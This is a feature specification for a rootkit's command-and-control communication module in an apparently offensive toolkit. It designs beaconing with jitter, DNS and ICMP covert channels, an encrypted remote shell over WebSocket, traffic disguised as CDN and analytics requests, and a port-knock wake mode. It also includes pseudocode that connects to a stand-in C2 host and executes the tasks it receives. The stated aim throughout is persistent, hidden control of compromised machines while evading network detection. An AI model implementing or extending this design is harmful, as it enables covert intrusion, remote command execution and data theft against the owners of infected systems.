# F0205: Rootkit Communication

## Metadata
| Field | Value |
|---|---|
| ID | F0205 |
| Priority | v2 |
| Status | Planned |
| MVP Phase | v2 |
| Depends on | F0015, F0200, F0204 |

## Summary
Communication framework for rootkit suite supporting configurable heartbeat intervals, multiple transport mechanisms (WebSocket, HTTP, DNS, ICMP), encrypted proprietary shell over WebSocket, and traffic masking. Enables rootkit to maintain persistent connection with Xero C2 while evading network detection.

## Requirements
- Configurable heartbeat interval (1 second to 24 hours)
- Jitter support for heartbeat timing
- Multiple transport: WebSocket, HTTP long-poll, DNS tunneling, ICMP
- Encrypted shell over WebSocket with AES-256-GCM
- Traffic masking (user-agent, headers, CDN mimicry)
- Connection retry with exponential backoff
- Dead peer detection and reconnection

## Heartbeat Configuration

`json
{
  "interval_seconds": 60,
  "jitter_percent": 25,
  "timeout_seconds": 30,
  "retry_backoff_ms": [1000, 2000, 5000, 10000, 30000],
  "max_retries": 10,
  "transport": "websocket",
  "fallback_transports": ["http", "dns"]
}
`

### Heartbeat Message Format

**Request:**
`json
{
  "type": "heartbeat",
  "beacon_id": "uuid",
  "timestamp": 1234567890,
  "metadata": {
    "pid": 1234,
    "uptime": 86400,
    "rootkit_status": "active"
  }
}
`

**Response:**
`json
{
  "type": "heartbeat_ack",
  "tasks": [...],
  "config_update": {...},
  "next_interval": 60
}
`

## Transport Mechanisms

### WebSocket (Primary)
`
wss://c2.example.com/rootkit/{beacon_id}
`

**Features:**
- Full-duplex communication
- Low latency
- Built-in keepalive
- TLS encryption

**Implementation:**
`c
// Connect to C2
ws_connect("wss://c2.example.com/rootkit/beacon_id");

// Send heartbeat
ws_send(heartbeat_message);

// Receive tasks
message = ws_recv();
if (message.type == "task") {
  execute_task(message.task);
}
`

### HTTP Long-Poll (Fallback)
`
POST /api/v1/rootkit/poll
Content-Type: application/json

{
  "beacon_id": "uuid",
  "heartbeat": true
}
`

**Features:**
- Firewall friendly (port 443)
- Retry on timeout
- Configurable poll interval

### DNS Tunneling (Covert)
`
TXT query: {encoded_data}.beacon_id.c2.example.com
`

**Features:**
- Extremely stealthy
- Works through most firewalls
- Low bandwidth
- High latency

**Encoding:** Base32 chunked into DNS labels (63 char limit)

### ICMP Covert Channel (Advanced)
`
ICMP Echo Request with data in payload
`

**Features:**
- Very stealthy (ping traffic)
- Bypasses most firewalls
- Low bandwidth

## Encrypted Shell Protocol

### Protocol Overview
`
+--------------------------------------------+
¦         WebSocket Connection               ¦
+--------------------------------------------¦
¦      AES-256-GCM Encrypted Tunnel          ¦
+--------------------------------------------¦
¦    Proprietary Binary Shell Protocol       ¦
+--------------------------------------------+
`

### Key Exchange
`
1. Client -> Server: ClientHello + ephemeral public key
2. Server -> Client: ServerHello + ephemeral public key + certificate
3. Both compute shared secret via ECDH
4. Derive AES-256-GCM key via HKDF
`

### Binary Protocol Format

**Command Frame:**
`
+--------+--------+----------------+----------------+
|  Type  | Length |    Payload     |   Tag (16)     |
|  1B    |   4B   |   Variable     |  (GCM auth)    |
+--------+--------+----------------+----------------+
`

**Frame Types:**
| Type | Name | Description |
| :--- | :--- | :--- |
| 0x01 | SHELL_CMD | Command to execute |
| 0x02 | SHELL_OUT | Standard output |
| 0x03 | SHELL_ERR | Standard error |
| 0x04 | SHELL_EOF | End of output |
| 0x05 | SHELL_CTRL | Control (resize, etc) |

### Shell Session Flow
`
Client                          Server
  |                               |
  |--- SHELL_CMD: "ls -la" ------>|
  |                               |
  |<-- SHELL_OUT: "total 48" -----|
  |<-- SHELL_OUT: "-rw-r--r-- ..." |
  |<-- SHELL_EOF -----------------|
  |                               |
`

## Traffic Masking

### User-Agent Rotation
`json
{
  "user_agents": [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "CloudFront-Health-Check/1.0"
  ],
  "rotation": "per_session"
}
`

### HTTP Headers
`
Host: cdn.example.com
User-Agent: CloudFront-Health-Check/1.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
X-Forwarded-For: 10.0.0.1
`

### CDN Traffic Mimicry
- Mimic CloudFront health checks
- Mimic Google Analytics beacons
- Mimic AWS service-to-service traffic
- Match request patterns and timing

## Stealth Sleep Mode

### Configuration
`json
{
  "sleep_mode": {
    "enabled": true,
    "trigger": "port_knock",
    "wake_sequence": [80, 443, 8080],
    "wake_timeout_seconds": 300,
    "heartbeat_during_sleep": false
  }
}
`

### Port Knocker Wake
`
1. Rootkit in sleep mode (no outbound traffic)
2. C2 sends TCP SYN to ports 80, 443, 8080 in sequence
3. Rootkit detects sequence via netfilter hook
4. Rootkit wakes and initiates connection to C2
`

### On-Demand Query
`
1. Rootkit in sleep mode
2. C2 sends HTTP GET to known endpoint
3. Rootkit responds with encoded beacon_id
4. Rootkit initiates full connection
`

## Connection State Machine

`
         +---------+
         |  IDLE   |
         +----+----+
              |
              | connect()
              v
         +---------+     timeout     +---------+
         | CONNECT | <-------------> |  RETRY  |
         +----+----+     backoff     +---------+
              |
              | success
              v
         +---------+
         |  READY  |
         +----+----+
              |
              | heartbeat/task
              v
         +---------+
         | ACTIVE  |
         +----+----+
              |
              | disconnect
              v
         +---------+
         |   END   |
         +---------+
`

## Stages

### Stage 1: Heartbeat Framework
**Goal:** Implement configurable heartbeat with WebSocket.
**Acceptance Criteria:**
- [ ] Configurable interval and jitter
- [ ] WebSocket connection to C2
- [ ] Heartbeat message exchange
- [ ] Connection retry with backoff

### Stage 2: Transport Fallbacks
**Goal:** Implement HTTP, DNS, ICMP transports.
**Acceptance Criteria:**
- [ ] HTTP long-poll fallback
- [ ] DNS tunneling for covert comms
- [ ] ICMP covert channel
- [ ] Automatic transport failover

### Stage 3: Encrypted Shell
**Goal:** Implement AES-256-GCM shell protocol.
**Acceptance Criteria:**
- [ ] ECDH key exchange
- [ ] Binary protocol encoding
- [ ] Interactive shell over WebSocket
- [ ] Output streaming

### Stage 4: Traffic Masking
**Goal:** Implement traffic masking features.
**Acceptance Criteria:**
- [ ] User-agent rotation
- [ ] CDN traffic mimicry
- [ ] Custom header injection
- [ ] Traffic timing randomization

### Stage 5: Stealth Sleep Mode
**Goal:** Implement sleep mode and wake mechanisms.
**Acceptance Criteria:**
- [ ] Sleep mode stops heartbeat
- [ ] Port knocker wake detection
- [ ] On-demand query response
- [ ] Configurable wake timeout

## Feature Acceptance Criteria

- [ ] Heartbeat works with configurable intervals
- [ ] All transports functional (WS, HTTP, DNS, ICMP)
- [ ] Encrypted shell connects and executes commands
- [ ] Traffic masking indistinguishable from legitimate traffic
- [ ] Sleep mode and wake sequence functional

## Test Plan

### Unit Tests
- [ ] test_heartbeat_interval_jitter
- [ ] test_websocket_connect_disconnect
- [ ] test_aes_encryption_decryption
- [ ] test_dns_encoding_decoding
- [ ] test_port_knock_detection

### System / Integration Tests
- [ ] Heartbeat received at C2 with correct interval
- [ ] Transport failover on WebSocket failure
- [ ] Shell command executes and returns output
- [ ] Traffic capture shows masked headers
- [ ] Sleep mode stops traffic; wake resumes

### Playwright Tests
- [ ] Rootkit builder shows communication options
- [ ] Configure heartbeat interval and transports
- [ ] Encrypted shell UI connects and shows output
- [ ] Toggle sleep mode from beacon detail

## Related Features

- **Overview:** [F0200](0200-rootkit-suite-overview.md)
- **Evasion:** [F0206](0206-rootkit-evasion.md)
- **Traffic Shaping:** [F0021](0021-traffic-shaping-profiles.md)
- **Interactive Shell:** [F0018](0018-interactive-shell-session.md)
